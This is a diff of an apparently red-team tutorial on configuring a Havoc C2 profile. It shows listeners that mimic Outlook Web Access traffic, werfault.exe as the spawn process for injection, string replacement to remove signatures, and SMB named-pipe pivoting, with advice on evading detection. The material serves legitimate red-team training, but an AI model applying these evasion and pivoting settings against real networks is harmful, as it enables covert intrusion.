@@ -15,9 +15,10 @@ The post will focus on Havoc C2.
     * [Replace strings](#replace-strings)
     * [sleep and jitter](#sleep-and-jitter)
   * [Listeners block](#listeners-block)
+    * [HTTP/HTTPS block](#httphttps-block)
+    * [SMB block](#smb-block)
   * [Teamserver block](#teamserver-block)
   * [Operators block](#operators-block)
-* Agent
 * [Beacon Object Files](../BOF/intro.md)
 * [Infra setup](Infrastructure-setup.md)
 
@@ -156,8 +157,8 @@ The spawn is used for post exploitation modules and injects into either x64 or x
 
 ```bash
 Demon {
-    Sleep  = 47 //47 seconds for checkin
-    Jitter = 62 //A randomization percentage applied to the sleep interval
+    Sleep  = 47 #47 seconds for checkin
+    Jitter = 62 #A randomization percentage applied to the sleep interval
     
     Injection {
      Spawn64 = "C:\\Windows\\System32\\werfault.exe"
@@ -191,12 +192,12 @@ Below is just an example of replacing strings and if you want to add more feel f
 
 
 ```bash
-//injection block for post exploitation.
+#injection block for post exploitation.
 Injection {
      Spawn64 = "C:\\Windows\\System32\\werfault.exe"
      Spawn32 = "C:\\Windows\\SysWOW64\\werfault.exe"
     }
-//payload generated block currently it only supports ReplaceStrings-x64 to remove some sigs such as demon.x64.exe
+#payload generated block currently it only supports ReplaceStrings-x64 to remove some sigs such as demon.x64.exe
     Binary {
         ReplaceStrings-x64 = {
             "demon.x64.dll": "",
@@ -234,13 +235,11 @@ If you have notice we have sleep and jitter on the profile when we generate it. 
 
 ## Listeners block
 
-The generated profile, gives the Listener block below
-
-### 
+The generated profile, gives the Listener block below. There's a lot of parameters here but generally some of it are self explanatory. Another thing that I will highly suggest is to change the values of the headers like the cookies, response and etc. As it may be signatured and could be easily detected. It's ideally good to always create your own.
 
 ```bash
-Listeners {
-    Http {
+Listeners { #listeners block
+    Http { # port 80
         Name         = "Agent Listener - HTTP"
         KillDate     = "2026-03-28 08:14:20"
         WorkingHours = "0:00-23:59"
@@ -253,46 +252,73 @@ Listeners {
         Uris         =  ["/owa/", "/OWA/"]
         Headers      =  ["Host: www.outlook.live.com", "Accept: */*", "Cookie: MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs"]
 
-        Response {
+        Response { # response of the server
             Headers  = ["Cache-Control: no-cache", "Pragma: no-cache", "Content-Type: text/html; charset=utf-8", "Server: Microsoft-IIS/10.0", "request-id: 6cfcf35d-0680-4853-98c4-b16723708fc9", "X-CalculatedBETarget: BY2PR06MB549.namprd06.prod.outlook.com", "X-Content-Type-Options: nosniff", "X-OWA-Version: 15.1.1240.20", "X-OWA-OWSVersion: V2017_06_15", "X-OWA-MinimumSupportedOWSVersion: V2_6", "X-Frame-Options: SAMEORIGIN", "X-DiagInfo: BY2PR06MB549", "X-UA-Compatible: IE=EmulateIE7", "X-Powered-By: ASP.NET", "X-FEServer: CY4PR02CA0010", "Connection: close"]
         }
     }
 
-    Http {
+    Http { # HTTPS
         Name         = "Agent Listener - HTTP/s"
         KillDate     = "2026-07-07 13:41:49"
         WorkingHours = "0:00-23:59"
         Hosts        =  ["192.168.56.101"]
         HostBind     = "0.0.0.0"
         HostRotation = "round-robin"
-        PortBind     =  443
-        Secure       =  true
-        UserAgent    = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
-        Uris         =  ["/owa/", "/OWA/"]
-        Headers      =  ["Host: www.outlook.live.com", "Accept: */*", "Cookie: MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs"]
+        PortBind     =  443 # port
+        Secure       =  true # Will use SSL
+        UserAgent    = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" # Useragent used in the HTTP request
+        Uris         =  ["/owa/", "/OWA/"] # url path
+        Headers      =  ["Host: www.outlook.live.com", "Accept: */*", "Cookie: MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs"] # headers of the request
 
         Response {
-            Headers  = ["Cache-Control: no-cache", "Pragma: no-cache", "Content-Type: text/html; charset=utf-8", "Server: Microsoft-IIS/10.0", "request-id: 6cfcf35d-0680-4853-98c4-b16723708fc9", "X-CalculatedBETarget: BY2PR06MB549.namprd06.prod.outlook.com", "X-Content-Type-Options: nosniff", "X-OWA-Version: 15.1.1240.20", "X-OWA-OWSVersion: V2017_06_15", "X-OWA-MinimumSupportedOWSVersion: V2_6", "X-Frame-Options: SAMEORIGIN", "X-DiagInfo: BY2PR06MB549", "X-UA-Compatible: IE=EmulateIE7", "X-Powered-By: ASP.NET", "X-FEServer: CY4PR02CA0010", "Connection: close"]
+            Headers  = ["Cache-Control: no-cache", "Pragma: no-cache", "Content-Type: text/html; charset=utf-8", "Server: Microsoft-IIS/10.0", "request-id: 6cfcf35d-0680-4853-98c4-b16723708fc9", "X-CalculatedBETarget: BY2PR06MB549.namprd06.prod.outlook.com", "X-Content-Type-Options: nosniff", "X-OWA-Version: 15.1.1240.20", "X-OWA-OWSVersion: V2017_06_15", "X-OWA-MinimumSupportedOWSVersion: V2_6", "X-Frame-Options: SAMEORIGIN", "X-DiagInfo: BY2PR06MB549", "X-UA-Compatible: IE=EmulateIE7", "X-Powered-By: ASP.NET", "X-FEServer: CY4PR02CA0010", "Connection: close"] # response of the server when it's successful.
         }
     }
-
+    # smb block for pivoting.
     Smb {
-        Name         = "Pivot - Smb"
-        PipeName     = "gecko.8410.5458.476275831687329289"
+        Name         = "Pivot - Smb" # smb listener name
+        PipeName     = "gecko.8410.5458.476275831687329289" # named pipe of the SMB
     }
 }
 ```
 
-## Teamserver block
+### HTTP/HTTPS block
 
-The teamserver block is pretty much self explanatory here is where the teamserver starts and listen and it's highly recommended to use different port and start the server locally. The build block is used for compiling C and assembly payload.
+* Name - the listener name
+* Killdate - if it reach the kill date the agent/demon will terminate itself if it's running.
+* Hosts - where the agent will connect to just think of it as a netcat listener, you can also add a domain and port
+* Host rotation - cycle through hosts sequentially.
+* Secure - will be https and have a cert/tls. Later on we will generate our own SSL cert since this will be needed for the redirector.
+* User-agent / headers / Uris - These 3 are important and self explanatory but the main purpose of these 3 are they used to blend into the network traffic and also used for callback. Lets say for example if the headers or Useragent does not match you wont be able to get a callback. You can also use a special header with a value or a special value in a header, this can be utilize for the redirector inorder for them to know that this specific callback is coming from our C2 and not from a bot.
+* Cert - You can specify your own SSL configuration, later I will do a walktrough for it.
+* Response - if the agent made a successful callback it will show a specific HTTP response you like.
+
+There are a lot more and I will highly suggest to check out the documentation. [Havoc profile](https://havocframework.com/docs/profiles).
+
+### SMB block
+
+* name - the smb listener name.
+* Pipename - the SMB pipename it will connects to. Ideally you should change the pipename into a smb looking pipe to blend into the network.
+
+To create a pivot connection you could do `pivot connect <host> <pipe>`. I will be showing an example on how to perform a lateral movement via havoc.
 
 ```bash
-//teamserver config where it runs
+Smb {
+        Name         = "Pivot - Smb" # smb listener name
+        PipeName     = "gecko.8410.5458.476275831687329289" # named pipe of SMB
+    }
+```
+
+## Teamserver block
+
+The teamserver block is pretty much self explanatory here is where the teamserver starts and listen and it's highly recommended to use different port and start the server locally. The build block is used for compiling C and assembly payload. 
+
+```bash
+#teamserver config where it runs
 Teamserver {
     Host = "127.0.0.1"
     Port = "29229"
-    //payload compiler
+    #payload compiler
     Build {
         Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
         Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
@@ -306,7 +332,7 @@ Teamserver {
 The operator block is where you specify the authentication to teamserver for each operator. As usualy the password should be strong as well.
 
 ```bash
-//users
+#users
 Operators {
     user "christinadeleon" {
         Password = "<REDACTED>"
@@ -317,8 +343,6 @@ Operators {
     }
 }
 ```
-
-## Interacting with Agent
 
 ![https://tenor.com/view/silksong-hollow-knight-hollow-night-silksong-faridulasimanet-sherma-silksong-gif-171830693794769624](../images/silksong-hollow-knight.gif)
 
